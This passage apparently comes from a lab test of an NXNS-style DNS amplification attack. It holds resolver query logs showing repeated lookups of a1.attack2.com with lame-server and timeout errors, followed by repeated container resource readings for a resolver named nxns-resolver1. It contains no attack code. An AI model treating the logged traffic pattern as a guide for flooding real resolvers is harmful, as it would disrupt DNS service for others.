12-Mar-2025 07:33:25.834 client @0x7f1254000cd0 172.16.114.11#39402 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:25.858 client @0x7f1268011f60 172.16.114.11#55848 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:25.918 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:25.922 client @0x7f1318000cd0 172.16.114.11#47028 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:25.966 client @0x7f1268011f60 172.16.114.11#55852 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:26.030 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:26.030 client @0x7f12d8004fb0 172.16.114.11#40893 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:26.050 client @0x7f1268011f60 172.16.114.11#55858 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:26.118 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:26.118 client @0x7f1268000cd0 172.16.114.11#52610 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:26.150 client @0x7f1268011f60 172.16.114.11#55866 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:26.218 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:26.218 client @0x7f12c0000cd0 172.16.114.11#58840 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:26.258 client @0x7f1268011f60 172.16.114.11#55872 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:26.326 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:26.326 client @0x7f1348000cd0 172.16.114.11#57155 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:26.370 client @0x7f1268011f60 172.16.114.11#55878 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:26.438 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:26.438 client @0x7f130c000cd0 172.16.114.11#57089 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:26.482 client @0x7f1268011f60 172.16.114.11#55884 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:26.550 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:26.550 client @0x7f12fc004fb0 172.16.114.11#42308 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:26.574 client @0x7f1268011f60 172.16.114.11#55900 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:26.646 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:26.646 client @0x7f1288000cd0 172.16.114.11#34865 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:26.690 client @0x7f1268011f60 172.16.114.11#55916 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:26.758 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:26.758 client @0x7f12cc000cd0 172.16.114.11#53283 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:26.778 client @0x7f1268011f60 172.16.114.11#55926 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:26.846 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:26.846 client @0x7f12c4000cd0 172.16.114.11#36588 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:26.870 client @0x7f124000b920 172.16.114.11#55928 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:26.938 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:26.938 client @0x7f1278000cd0 172.16.114.11#53497 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:26.970 client @0x7f124000b920 172.16.114.11#55934 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:27.026 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:27.026 client @0x7f133c000cd0 172.16.114.11#57781 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:27.070 client @0x7f12b4019990 172.16.114.11#55938 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:27.142 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:27.142 client @0x7f130c000cd0 172.16.114.11#49753 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:27.186 client @0x7f12880483d0 172.16.114.11#55948 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:27.250 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:27.254 client @0x7f12b8000cd0 172.16.114.11#42671 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:27.294 client @0x7f12a800b920 172.16.114.11#55950 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:27.346 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:27.346 client @0x7f12dc000cd0 172.16.114.11#57359 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:27.394 client @0x7f12880483d0 172.16.114.11#55956 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:27.454 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:27.454 client @0x7f1378000cd0 172.16.114.11#36092 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:27.498 client @0x7f12880483d0 172.16.114.11#55964 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:27.558 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:27.558 client @0x7f1288000cd0 172.16.114.11#52472 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:27.582 client @0x7f12880483d0 172.16.114.11#55968 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:27.626 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:27.626 client @0x7f1368000cd0 172.16.114.11#47074 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:27.670 client @0x7f12880483d0 172.16.114.11#55974 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:27.734 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:27.734 client @0x7f1270000cd0 172.16.114.11#50432 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:27.778 client @0x7f127000b920 172.16.114.11#55984 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:27.818 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:27.822 client @0x7f12cc000cd0 172.16.114.11#41510 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:27.866 client @0x7f12a800e650 172.16.114.11#55986 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:27.918 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:27.918 client @0x7f12c8000cd0 172.16.114.11#55850 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:27.962 client @0x7f12880483d0 172.16.114.11#56000 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:28.026 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:28.026 client @0x7f12e0000cd0 172.16.114.11#56701 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:28.074 client @0x7f12a8007340 172.16.114.11#56010 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:28.122 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:28.126 client @0x7f12e0000cd0 172.16.114.11#44997 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:28.154 client @0x7f125400ff50 172.16.114.11#56016 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:28.206 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:28.206 client @0x7f1350000cd0 172.16.114.11#39999 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:28.230 client @0x7f12880483d0 172.16.114.11#56022 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:28.294 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:28.294 client @0x7f1248000cd0 172.16.114.11#53803 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:28.326 client @0x7f12880483d0 172.16.114.11#56030 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:28.382 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:28.382 client @0x7f1330000cd0 172.16.114.11#50270 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:28.414 client @0x7f12880483d0 172.16.114.11#56044 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:28.474 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:28.474 client @0x7f1380000cd0 172.16.114.11#33991 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:28.518 client @0x7f12880483d0 172.16.114.11#56056 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:28.578 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:28.582 client @0x7f12fc004fb0 172.16.114.11#43765 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:28.626 client @0x7f127000b920 172.16.114.11#56058 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:28.666 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:28.666 client @0x7f12ac000cd0 172.16.114.11#36585 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:28.710 client @0x7f12b4019990 172.16.114.11#56066 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:28.774 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:28.778 client @0x7f12e0000cd0 172.16.114.11#33266 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:28.822 client @0x7f125400ff50 172.16.114.11#56072 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:28.874 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:28.878 client @0x7f137c000cd0 172.16.114.11#59439 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:28.898 client @0x7f12a8007340 172.16.114.11#56086 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:28.950 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:28.950 client @0x7f132c000cd0 172.16.114.11#38203 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:28.994 client @0x7f1284015970 172.16.114.11#56094 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:29.062 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:29.062 client @0x7f12e80bf6d0 172.16.114.11#57202 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:29.094 client @0x7f1284015970 172.16.114.11#56102 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:29.162 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:29.162 client @0x7f12a8000cd0 172.16.114.11#47208 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:29.194 client @0x7f12880483d0 172.16.114.11#56104 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:29.270 lame server resolving 'a1.attack2.com' (in 'a1.attack2.com'?): 172.16.114.11#53
12-Mar-2025 07:33:29.270 client @0x7f12d0000cd0 172.16.114.11#50314 (a1.attack2.com): query: a1.attack2.com IN A -E(0)DCV (172.16.114.18)
12-Mar-2025 07:33:29.314 client @0x7f12840186a0 172.16.114.11#56112 (a1.attack2.com): query: a1.attack2.com IN A -E(0)TDCV (172.16.114.18)
12-Mar-2025 07:33:29.334 client @0x7f12d8000cd0 172.16.0.1#51497 (a1.attack2.com): query failed (timed out) for a1.attack2.com/IN/A at query.c:6883
12-Mar-2025 07:33:29.334 client @0x7f1244000cd0 172.16.0.1#42827 (a1.attack2.com): query failed (timed out) for a1.attack2.com/IN/A at query.c:6883
12-Mar-2025 07:33:29.334 client @0x7f12fc000cd0 172.16.0.1#37029 (a1.attack2.com): query failed (timed out) for a1.attack2.com/IN/A at query.c:6883
```

System monitoring data is as follows:

```
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.01%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.01%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.01%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.01%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O         PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     1008MiB / 2GiB      49.23%    17.7MB / 17.6MB   24.6kB / 8.19kB   243 [K
 [K
